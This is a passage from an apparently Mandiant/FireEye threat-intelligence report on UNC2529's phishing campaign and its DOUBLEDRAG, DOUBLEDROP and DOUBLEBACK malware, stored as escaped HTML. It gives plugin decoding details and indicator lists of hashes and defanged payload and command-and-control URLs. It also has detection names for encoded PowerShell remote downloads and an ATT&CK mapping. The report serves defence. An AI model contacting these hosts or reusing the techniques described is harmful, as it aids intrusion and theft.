implemented as a combination of rolling DWORD\/BYTE XOR with initial value specified by the plugin_header_t.xor_val value. The plugin_header_t.len_1 stores the number of DWORDS to be decoded with plugin_header_t.xor_val which is incremented by 4 after each iteration. The plugin_header_t.len_2 specifies the number of bytes to be decoded at the current position after the previous operation with the current value of the plugin_header_t.xor_val (only the least significant byte is taken). In this mode the plugin_header_t.xor_val value is incremented by one after each iteration.\u003C\/p\u003E\n\u003Cp\u003EThe plugins are expected to export at least two functions\u2014one for initialization and another to clean up the resources before unloading. The initialization routine takes four parameters\u2014two from the header and two calculated by the backdoor, as shown Figure 16.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Epfn_init(implant_id, plugin_header_t.param_2, plugin_header_t.param_3, p_plugin_image_in_memory)\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 16: Plugins initialization routine prototype\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe current backdoor\u0027s implementation provides support for up to 32 plugins with each of them mapped and initialized in the backdoor\u0027s process space.\u003C\/p\u003E\n\u003Ch5\u003EAdditional Notes\u003C\/h5\u003E\n\u003Cp\u003EThe first backdoor instance we observed back in December 2020 was a stable and well-written code, but it was clearly a work in progress. For example, the early instance of the malware spawns a thread to secure delete the DOUBLEDROP dropper from disk which indicates that an earlier variant of this malware launched a copy of the dropper from the file system. The dropper would save its current location on disk in the default registry value under the HK[LM|CU]:\\Software\\Classes key. The backdoor spawns a dedicated thread that retrieves the dropper\u2019s path and then proceeds to overwrite the image on disk with 0x00, 0xFF, and a randomly generated byte before deleting the dropper from the file system.\u003C\/p\u003E\n\u003Cp\u003EAdditionally, the early instance of the backdoor, as mentioned, would not handle the situations when an elevated PowerShell process is used. The dropper would use a scheduled task in that case with the relevant registry keys created under the HKLM hive but the backdoor does not support that case and will not be able to find its image under the specific key in order to inject itself into the msiexec.exe process.\u003C\/p\u003E\n\u003Cp\u003EFinally, the backdoor would output debug information in a few cases using the OutputDebugString API. Interestingly, the format and the generation of the log message is the same as the one used in the \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/DeadNumbers\/Pegasus\/blob\/f83159ebcc2b2ba429b23805fdc66ab3eb2959f5\/Pegasus\/inc\/dbg.c\u0022\u003Epublicly available PEGASUS\u0026nbsp;code\u003C\/a\u003E\u0026nbsp;(\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/advantage.mandiant.com\/reports\/18-00012170\u0022\u003Epreliminary technical analysis: Pegasus Malware Source Code\u003C\/a\u003E). The PEGASUS backdoor is distributed with modules that allow it to manipulate files generated by common Russian payment processing software that is used to assess and process VAT refunds. When executed on a workstation running targeted software, the malware can attempt to add VAT to transactions that are normally exempt and directs associated tax refunds to attacker-controlled bank accounts.\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003EConsiderable resources were employed by UNC2529 to conduct their December phishing campaign. Almost 50 domains supported various phases of the effort, targets were researched, and a legitimate third-party domain was compromised. The threat actor made extensive use of obfuscation and fileless malware to complicate detection to deliver a well coded and extensible backdoor. UNC2529 is assessed as capable, professional and well resourced. The identified wide-ranging targets, across geography and industry suggests a financial crime motive.\u003C\/p\u003E\n\u003Cp\u003EDOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further actions by UNC2529 to compromise victims across all industries worldwide.\u003C\/p\u003E\n\u003Ch4\u003ETechnical Indicators\u003C\/h4\u003E\n\u003Ch5\u003EDOUBLEDRAG \/ BIFF8\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EFiles\u003C\/i\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022480\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMD5\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ERole\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EWave\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E39fc804566d02c35f3f9d67be52bee0d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDOUBLEDRAG\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E44f7af834ee7387ac5d99a676a03cfdd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDOUBLEDRAG\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4e5583e34ad54fa7d1617f400281ba56\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPDF Decoy\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ee80dc4c3e26deddcc44e66bb19b6fb58\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPDF Decoy\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E169c4d96138d3ff73097c2a9aab5b1c0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EZip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ee70502d020ba707095d46810fd32ee49\u003Csup\u003E\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EZip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003Csup\u003Est\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E62fb99dc271abc104504212157a4ba91\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExcel BIFF8 macro\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2\u003Csup\u003End\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1d3fcb7808495bd403973a0472291da5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPDF Decoy\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2\u003Csup\u003End\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E6a1da7ee620c638bd494f4e24f6f1ca9\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022142\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EZip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002281\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2\u003Csup\u003End\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ea28236b43f014c15f7ad4c2b4daf1490\u003Csup\u003E\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EZip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2\u003Csup\u003End\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ed594b3bce66b8b56881febd38aa075fb\u003Csup\u003E\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EZip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022257\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2\u003Csup\u003End\u003C\/sup\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Ci\u003EDomains\u003C\/i\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022480\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDec. 2, 2020 Wave\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDec. 11\u0026nbsp;to 18, 2020 Wave\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eadupla[.]net\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eaibemarle[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eceylonbungalows[.]net\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ebestwalletforbitcoin[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Echandol[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ebitcoinsacks[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eclosetdeal[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edigitalagencyleeds[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edaldhillon[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eerbilmarriott[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edesmoncreative[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eethernetpedia[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efarmpork[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efileamazon[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Egemralph[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Egamesaccommodationscotland[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eisjustlunch[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Egreathabibgroup[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Elogicmyass[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Einfomarketx[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Elottoangels[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ejagunconsult[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Emangoldsengers[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ekhodaycontrolsystem[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eoconeeveteransmemorial[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Emaninashop[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Escottishhandcraft[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eonceprojects[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eseathisons[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Esimcardhosting[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eskysatcam[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Estayzarentals[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Esmartnhappy[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etouristboardaccommodation[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Estepearn[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etowncentrehotel[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Esugarmummylove[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evacuumcleanerpartsstore[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etechooze[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ezmrtu[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etigertigerbeads[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etotallyhealth-wealth[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Etowncenterhotel[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022227\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Euaeworkpermit[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022253\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch5\u003EDOUBLEDROP\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EMD5\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E4b32115487b4734f2723d461856af155\u003C\/li\u003E\n\u003Cli\u003E9e3f7e6697843075de537a8ba83da541\u003C\/li\u003E\n\u003Cli\u003Ecc17e0a3a15da6a83b06b425ed79d84c\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EURLs\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehxxp:\/\/p-leh[.]com\/update_java.dat\u003C\/li\u003E\n\u003Cli\u003Ehxxp:\/\/clanvisits[.]com\/mini.dat\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/towncentrehotels[.]com\/ps1.dat\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EDOUBLEBACK\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EMD5\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E1aeecb2827babb42468d8257aa6afdeb\u003C\/li\u003E\n\u003Cli\u003E1bdf780ea6ff3abee41fe9f48d355592\u003C\/li\u003E\n\u003Cli\u003E1f285e496096168fbed415e6496a172f\u003C\/li\u003E\n\u003Cli\u003E6a3a0d3d239f04ffd0666b522b8fcbaa\u003C\/li\u003E\n\u003Cli\u003Ece02ef6efe6171cd5d1b4477e40a3989\u003C\/li\u003E\n\u003Cli\u003Efa9e686b811a1d921623947b8fd56337\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EURLs\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehxxps:\/\/klikbets[.]net\/admin\/client.php\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/lasartoria[.]net\/admin\/client.php\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/barrel1999[.]com\/admin4\/client.php\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/widestaticsinfo[.]com\/admin4\/client.php\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/secureinternet20[.]com\/admin5\/client.php\u003C\/li\u003E\n\u003Cli\u003Ehxxps:\/\/adsinfocoast[.]com\/admin5\/client.php\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EDetections\u003C\/h4\u003E\n\u003Cp\u003EFireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of exploitation or post-exploitation activities we associate with UNC2529.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cb\u003EPlatforms\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd\u003E\u003Cp\u003E\u003Cb\u003EDetection Name\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork Security\u003C\/p\u003E\n\u003Cp\u003EEmail Security\u003C\/p\u003E\n\u003Cp\u003EDetection On Demand\u003C\/p\u003E\n\u003Cp\u003EMalware File Scanning\u003C\/p\u003E\n\u003Cp\u003EMalware File Storage Scanning\u003Cu\u003E\u003C\/u\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022357\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003EFEC_Trojan_JS_DOUBLEDRAG_1 (static)\u003C\/li\u003E\n\u003Cli\u003EFE_Trojan_JS_DOUBLEDRAG_1 (static)\u003C\/li\u003E\n\u003Cli\u003EDownloader.DOUBLEDRAG (network)\u003C\/li\u003E\n\u003Cli\u003EDownloader.JS.DOUBLEDRAG.MVX (dynamic)\u003C\/li\u003E\n\u003Cli\u003EFE_Dropper_PS1_DOUBLEDROP_1 (static)\u003C\/li\u003E\n\u003Cli\u003EFEC_Dropper_PS1_DOUBLEDROP_1 (static)\u003C\/li\u003E\n\u003Cli\u003EDropper.PS1.DOUBLEDROP.MVX (dynamic)\u003C\/li\u003E\n\u003Cli\u003EFE_Backdoor_Win_DOUBLEBACK_1 (static)\u003C\/li\u003E\n\u003Cli\u003EFE_Backdoor_Win_DOUBLEBACK_2 (static)\u003C\/li\u003E\n\u003Cli\u003EFE_Backdoor_Win_DOUBLEBACK_3 (static)\u003C\/li\u003E\n\u003Cli\u003EFE_Backdoor_Win_DOUBLEBACK_4 (static)\u003C\/li\u003E\n\u003Cli\u003EBackdoor.Win.DOUBLEBACK (network)\u003C\/li\u003E\n\u003Cli\u003EMalware.Binary.xls\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEndpoint Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022357\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ci\u003EReal-Time (IOC)\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EPOWERSHELL ENCODED REMOTE DOWNLOAD (METHODOLOGY)\u003C\/li\u003E\n\u003Cli\u003ESUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\u003C\/li\u003E\n\u003Cli\u003EMALICIOUS SCRIPT CONTENT A (METHODOLOGY)\u003C\/li\u003E\n\u003Cli\u003EPOWERSHELL INVOCATION FROM REGISTRY ARTIFACT (METHODOLOGY)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EMalware Protection (AV\/MG)\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EGeneric.mg.1aeecb2827babb42\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.1bdf780ea6ff3abe\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.1f285e496096168f\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.6a3a0d3d239f04ff\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.ce02ef6efe6171cd\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.fa9e686b811a1d92\u003C\/li\u003E\n\u003Cli\u003ETrojan.JS.Agent.TZP\u003C\/li\u003E\n\u003Cli\u003EGen:Variant.Ulise.150277\u003C\/li\u003E\n\u003Cli\u003EGen:Variant.Ulise.150283\u003C\/li\u003E\n\u003Cli\u003EGen:Variant.Razy.799918\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EUNC2529 MITRE ATT\u0026amp;CK Mapping\u003C\/h4\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EATT\u0026amp;CK Tactic Category\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ETechniques\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EResource Development\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1584\u0022\u003ECompromise Infrastructure\u003C\/a\u003E (TT1584)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1587\u0022\u003EDevelop Capabilities\u003C\/a\u003E (T1587)\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1587\/003\u0022\u003EDigital Certificates\u003C\/a\u003E (T1587.003)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1588\u0022\u003EObtain Capabilities\u003C\/a\u003E (T1588)\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1588\/004\u0022\u003EDigital Certificates\u003C\/a\u003E 